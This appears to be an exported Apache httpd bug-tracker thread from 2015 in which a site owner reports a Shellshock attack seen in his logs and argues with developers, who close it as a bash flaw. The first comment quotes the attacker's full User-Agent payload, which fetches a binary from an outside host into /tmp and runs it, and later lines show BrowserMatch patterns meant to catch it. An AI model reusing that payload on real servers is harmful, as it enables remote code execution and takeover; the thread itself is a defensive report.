[{"count": 0, "tags": [], "bug_id": 57580, "text": "User-Agent: \"() { :;};/usr/bin/perl -e 'print \\\"Content-Type: text/plain\\\\r\\\\n\\\\r\\\\nXSUCCESS!\\\";system(\\\"wget http://play.marketplay.eu/apache22 -O /tmp/apache24;curl -O /tmp/apache24 http://play.marketplay.eu/apache22;chmod 777 /tmp/apache24;/tmp/apache24;\\\");'\"\n\n(Outermost quotes added by my log file)\n\nThis bug is creating a /tmp/apache24 file, which appears to be a binary where execution is subsequently attempted.  (Whether \"suexec\" permits or denies the binary is immaterial to the exploit.)\n\nThe problem is the creation of the file from executing the perl code in the User-Agent string.  The file should never be created, because the user-agent string should never be executed by the system command processor.  The perl system() call should not happen, but it is happening - as the target file in /tmp is being created.  I cannot say if it's the \"wget\" or \"curl\" command which creates the file, nor does that matter.\n\n/tmp:\ntotal 61\ndrwxrwxrwt  2 root    none    60 Feb 12 18:39 .\ndrwxr-xr-x 22 root    none  1024 Dec 10 22:36 ..\n-rwxrwxrwx  1 webserv html 61112 Feb 12 03:25 apache24\n\nSystem:  Linux 3.18.6\nServer version: Apache/2.4.12 (Unix)\nServer built:   Feb  9 2015 02:47:36\nServer's Module Magic Number: 20120211:41\nServer loaded:  APR 1.4.2, APR-UTIL 1.3.10\nCompiled using: APR 1.4.2, APR-UTIL 1.3.10\nArchitecture:   64-bit\nServer MPM:     worker\n  threaded:     yes (fixed thread count)\n    forked:     yes (variable process count)\nServer compiled with....\n -D APR_HAS_SENDFILE\n -D APR_HAS_MMAP\n -D APR_HAVE_IPV6 (IPv4-mapped addresses enabled)\n -D APR_USE_SYSVSEM_SERIALIZE\n -D APR_USE_PTHREAD_SERIALIZE\n -D SINGLE_LISTEN_UNSERIALIZED_ACCEPT\n -D APR_HAS_OTHER_CHILD\n -D AP_HAVE_RELIABLE_PIPED_LOGS\n -D DYNAMIC_MODULE_LIMIT=256\n -D HTTPD_ROOT=\"/usr\"\n -D SUEXEC_BIN=\"/usr/bin/suexec\"\n -D DEFAULT_PIDLOG=\"/var/logs/httpd.pid\"\n -D DEFAULT_SCOREBOARD=\"logs/apache_runtime_status\"\n -D DEFAULT_ERRORLOG=\"logs/error_log\"\n -D AP_TYPES_CONFIG_FILE=\"/var/lib/httpd/conf/mime.types\"\n -D SERVER_CONFIG_FILE=\"/var/lib/httpd/conf/httpd.conf\"\n\nShutting down the service at http://play.marketplay.eu will not fix the exploit, as all the author has to do is move to another server.\n\nAttempts to kill the exploit using BrowserMatch statements do not block it.\n\n    BrowserMatchNoCase \"(system\\(|wget\\ -O)\"    no-log  virus\n    BrowserMatchNoCase /bin/(p(erl|ph)|b?a?sh)  no-log  virus\n\nThe \"virus\" variable is set to 1, but the file still gets created.  The HTTP response code is 400, no-keep-alive.\n\nExploit:  Why is the User-Agent string being executed in the first place?\nThis bug may be similar to 50561, but I have identified the point of attack.", "id": 181025, "time": "2015-02-12T22:46:55Z", "creator": "software+httpd@kd6lvw.ampr.org", "creation_time": "2015-02-12T22:46:55Z", "is_private": false, "attachment_id": null}, {"attachment_id": null, "tags": [], "creator": "covener@gmail.com", "is_private": false, "count": 1, "id": 181027, "time": "2015-02-12T23:08:19Z", "bug_id": 57580, "creation_time": "2015-02-12T23:08:19Z", "text": "Looks like shell shock (bash)"}, {"count": 2, "tags": [], "text": "Maybe so, but regardless of the fix in BASH, the Apache HTTPD server should still not be passing the value to a(ny) command interpreter - and THAT is a bug in this software.\n\nRelying on a patch in software under different authorship is akin to \"security via obscurity\" -- it is NOT a fix.  The HTTPD server is cooperating with another program to cause the exploit, which means that BOTH programs should be fixed, even if fixing the other by itself closes the exploit.", "attachment_id": null, "bug_id": 57580, "id": 181034, "time": "2015-02-13T03:27:34Z", "creator": "software+httpd@kd6lvw.ampr.org", "creation_time": "2015-02-13T03:27:34Z", "is_private": false}, {"count": 3, "tags": [], "creator": "ylavic.dev@gmail.com", "attachment_id": null, "is_private": false, "id": 181049, "time": "2015-02-13T10:25:04Z", "bug_id": 57580, "creation_time": "2015-02-13T10:25:04Z", "text": "(In reply to D. Stussy from comment #2)\n> Maybe so, but regardless of the fix in BASH, the Apache HTTPD server should\n> still not be passing the value to a(ny) command interpreter - and THAT is a\n> bug in this software.\n\nWhich value shouldn't be passed, any?\nApache HTTPd is not responsible for the interpreter to mis-interpret the value (a plain text).\n\nThere are third party modules (mod_security, mod_untaint, ...) that will filter/block/act on values that shouldn't be passed to CGIs, but that's not considered a core httpd feature."}, {"count": 4, "attachment_id": null, "bug_id": 57580, "text": "Obviously, it is, and you are wrong.  How else do you explain that the value of the User-Agent request header is being executed by a command interpreter?  The only way that can happen is when apache extracts the header's value and submits it.  Whether that submission is intentional or implicit is the next logical question, but I submit that intentional submission is a misdesign that needs correction.  Should this be implicit, whether by accident or intentional side-effect, that too needs correction.\n\nThis is not an issue of the value simply being passed.  It's an issue of what happens to that value as it is being passed.  Somehow, it is being interpreted and executed as a command string, and that is wrong.  If this is indeed happening during the CGI interface, a redesign is needed.  The \"User-Agent:\" header should be a read-only, non-substitutional value (i.e. constant and never changing).  There should be no processing other than perhaps a string copy to the appropriate CGI variable.  Whatever else is happening is erroneous.", "id": 181060, "time": "2015-02-13T19:48:09Z", "creator": "software+httpd@kd6lvw.ampr.org", "creation_time": "2015-02-13T19:48:09Z", "tags": [], "is_private": false}, {"count": 5, "tags": [], "bug_id": 57580, "text": "This is not a bug in httpd, it is a security flaw in the interpreter you have intalled on your system that has since been fixed in bash. We will not change httpd to work around bugs in other programs, end of story. That is for them to fix. Closing as invalid.", "id": 181061, "time": "2015-02-13T19:57:39Z", "creator": "humbedooh@apache.org", "creation_time": "2015-02-13T19:57:39Z", "is_private": false, "attachment_id": null}, {"count": 6, "tags": [], "creator": "software+httpd@kd6lvw.ampr.org", "is_private": false, "text": "When my web site saw this string, the request was answered by one of two 4xx error-handling pages (depending in whether the \"virus\" variable was set or unset).  Both of those pages use the SSI interface of mod_include to print (#echo) the user-agent field.  Should the print function (#echo or #printenv) be responsible for calling the perl interpreter (in my case), it is WRONG because it is performing substitution on the CGI variable contents when not asked to.  The only time the SSI interface should be calling any external program is when #exec is encountered (or #include virtual).", "id": 181062, "time": "2015-02-13T20:02:31Z", "bug_id": 57580, "creation_time": "2015-02-13T20:02:31Z", "attachment_id": null}, {"count": 7, "tags": [], "creator": "software+httpd@kd6lvw.ampr.org", "attachment_id": null, "text": "RE: #5 - You don't get it.  It is a bug in BOTH programs.  Fixing one program does not relieve responsibility to fix the other as it can reoccur when interfacing to a different external program.  There needs to be an Apache HTTPD fix as well.", "id": 181063, "time": "2015-02-13T20:04:40Z", "bug_id": 57580, "creation_time": "2015-02-13T20:04:40Z", "is_private": false}, {"count": 8, "tags": [], "creator": "humbedooh@apache.org", "attachment_id": null, "text": "Let me reiterate what I just said;\nThis is not a bug in httpd, it is a security flaw in the interpreter you have installed on your system that has since been fixed in bash. We will not change httpd to work around security flaws in other programs, end of story. That is for them to fix. Closing as invalid.\n\nThis is your first, last and final warning. If you reopen this invalid ticket again, it will be seen as an act of spamming and/or trolling as well as a blatant disregard for the opinions of the httpd developers and you will be banned from this system. I hope I have made myself clear.", "id": 181064, "time": "2015-02-13T20:10:46Z", "bug_id": 57580, "creation_time": "2015-02-13T20:10:46Z", "is_private": false}, {"count": 9, "tags": [], "bug_id": 57580, "text": "RE: #5 - You don't get it.  It is a bug in BOTH programs.  Fixing one program does not relieve responsibility to fix the other as it can reoccur when interfacing to a different external program.  There needs to be an Apache HTTPD fix as well.\n\nMy above example shows the BUG without any use of BASH.", "id": 181065, "time": "2015-02-13T20:13:58Z", "creator": "software+httpd@kd6lvw.ampr.org", "creation_time": "2015-02-13T20:13:58Z", "is_private": false, "attachment_id": null}, {"count": 10, "tags": [], "bug_id": 57580, "text": "Show me where BASH is called in this SSI using mod_include:\n\n<HTML><HEAD>\n    <TITLE>Error 400 - Bad Request or Syntax Error</TITLE>\n    <META NAME=\"DC.Date.Created\"  CONTENT=\"2002-05-10 00:00:00\">\n    <META NAME=\"DC.Date.Modified\" CONTENT=\"2010-03-15 00:00:00\">\n    <META NAME=\"Description\" CONTENT=\"HTTP Server 400 Error Page\">\n    <META NAME=\"Classification\" CONTENT=\"HTTP Server Error Handler Page\">\n    <META NAME=\"Robots\" CONTENT=\"NoIndex,NoFollow,NoArchive,NoCache,NoSnippet\">\n    <META HTTP-EQUIV=\"Content-Type\" CONTENT=\"Text/HTML; CHARSET=iso-8859-1\">\n</HEAD><BODY TEXT=BLACK BGCOLOR=WHITE LINK=BLUE VLINK=RED ALINK=\"#33FF33\">\n<B>An <FONT COLOR=RED>ERROR</FONT> has occurred:&nbsp; Access to that web page,\nscript, or other service has been denied.&nbsp; Either an error has been made in\nthe target page or service, or your web browser issued an improper or malformed\nrequest.&nbsp; Try again.</B>\n<BR CLEAR=BOTH><HR><TABLE ALIGN=CENTER BGCOLOR=LIGHTCYAN WIDTH=100%><TR>\n    <TD ALIGN=RIGHT><B>Requested Page:</B></TD>\n    <TD><B>http<!--#if expr=\"$HTTPS = on\" -->s<!--#endif -->://<!--#echo\n        var=\"HTTP_HOST\" var=\"REQUEST_URI\" --></B></TD>\n<!--#if expr=\"$HTTP_REFERER\" --></TR><TR>\n    <TD ALIGN=RIGHT><B>Referring Page:</B></TD>\n    <TD><B><!--#echo var=\"HTTP_REFERER\" --></B></TD>\n<!--#endif --></TR><TR>\n    <TD ALIGN=RIGHT><B>Requested From:</B></TD>\n    <TD><B><!--#echo var=\"REMOTE_ADDR\" --> : <!--#echo var=\"REMOTE_PORT\" -->\n        <!--#if expr=\"HTTP_ACCEPT_BROWSER\" -->\n        <!--#if expr=\"$HTTP_ACCEPT_BROWSER = msie\" -->(Internet Explorer)\n        <!--#elif expr=\"$HTTP_ACCEPT_BROWSER = ns\" -->(Netscape)\n        <!--#elif expr=\"$HTTP_ACCEPT_BROWSER = lynx\" -->(Lynx)\n        <!--#elif expr=\"$HTTP_ACCEPT_BROWSER = safari\" -->(Safari)\n        <!--#elif expr=\"$HTTP_ACCEPT_BROWSER = firefox\" -->(Firefox)\n        <!--#elif expr=\"$HTTP_ACCEPT_BROWSER = chrome\" -->(Google Chrome)\n        <!--#else -->(<!--#echo var=\"HTTP_ACCEPT_BROWSER\" -->)<!--#endif -->\n        <!--#endif --><!--#if expr=\"$REDIRECT_REQUEST_METHOD\" -->\n        [<!--#echo var=\"REDIRECT_REQUEST_METHOD\" -->]<!--#else -->\n        [<!--#echo var=\"REQUEST_METHOD\" -->]<!--#endif --></B></TD>\n<!--#if expr=\"$HTTPS\" --></TR><TR>\n    <TD ALIGN=RIGHT><B>Encryption Method:</B></TD>\n    <TD><B><!--#echo var=\"SSL_PROTOCOL_VERSION\" --><!--#echo var=\"HTTPS_CIPHER\"\n        --><!--#echo var=\"HTTPS_KEYSIZE\" --></B></TD>\n<!--#endif --><!--#if expr=\"$REMOTE_USER\" --></TR><TR>\n    <TD ALIGN=RIGHT><B>Validated User:</B></TD>\n    <TD><B><!--#echo var=\"REMOTE_USER\" --></B></TD>\n<!--#endif --></TR></TABLE><HR></BODY></HTML>\n\n\nI see no #execs (direct) and no #include virutals (indirect) directives here.  BASH is never invoked, yet this script is still vulnerable to the bug.  Not only that, I don't explicitly use the \"USER_AGENT\" variable in the script (but it is used in the configuration file to set the \"HTTP_ACCEPT_BROWSER\" value by using BrowserMatch statements).", "id": 181066, "time": "2015-02-13T20:23:01Z", "creator": "software+httpd@kd6lvw.ampr.org", "creation_time": "2015-02-13T20:23:01Z", "is_private": false, "attachment_id": null}]